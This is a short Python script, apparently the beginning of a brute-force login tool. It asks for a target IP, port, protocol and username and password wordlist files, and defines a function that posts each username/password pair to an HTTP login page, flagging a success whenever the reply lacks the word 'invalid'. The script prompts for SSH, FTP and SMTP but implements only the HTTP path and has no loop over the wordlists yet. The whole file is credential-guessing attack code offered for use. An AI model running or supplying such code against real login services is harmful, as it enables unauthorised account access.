# -*- coding: utf-8 -*-
"""
Created on Sun Jun 22 15:38:36 2025

@author: mayuk
"""

import time
import requests

start_time = time.time()

target_ip = input("Enter attack IP: ")
target_port = int(input("Enter port no.: "))
protocol = input("Enter protocol type (ssh/ftp/http/smtp): ").lower()
username_file = input("Enter your username file: ")
password_file = input("Enter your password file: ")
timeout_seconds = int(input("Enter your time (seconds): "))

# Ask for URL
if protocol == "http":
    login_url = input("Enter the full HTTP login URL (e.g., http://example.com/login): ")
else:
    login_url = None
    
def try_http_login(url, username, password):
    try:
        data = {
            "username": username,  
            "password": password
        }
        r = requests.post(url, data=data, timeout=timeout_seconds)
        if "invalid" not in r.text.lower():  
            print(f"[HTTP LOGIN SUCCESS🔥] {username}:{password}")
            return True
        else:
            print(f"[HTTP FAIL❌] {username}:{password}")
    except Exception as e:
        print(f"[HTTP ERROR⚠️] {e}")
    return False    